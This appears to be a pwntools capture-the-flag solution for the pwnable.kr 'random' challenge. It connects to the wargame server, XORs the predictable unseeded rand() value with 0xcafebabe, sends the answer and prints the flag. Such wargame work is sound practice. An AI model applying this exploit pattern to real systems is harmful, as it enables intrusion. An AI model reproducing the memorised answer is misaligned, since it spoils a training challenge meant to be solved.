from pwn import *

r = remote("pwnable.kr",10005)

random =  0x6b8b4567
playload = random ^ 0xcafebabe
r.sendline(str(playload).encode())
data = r.recv(1024)
flag = r.recv(1024)

print(data)
print(flag)

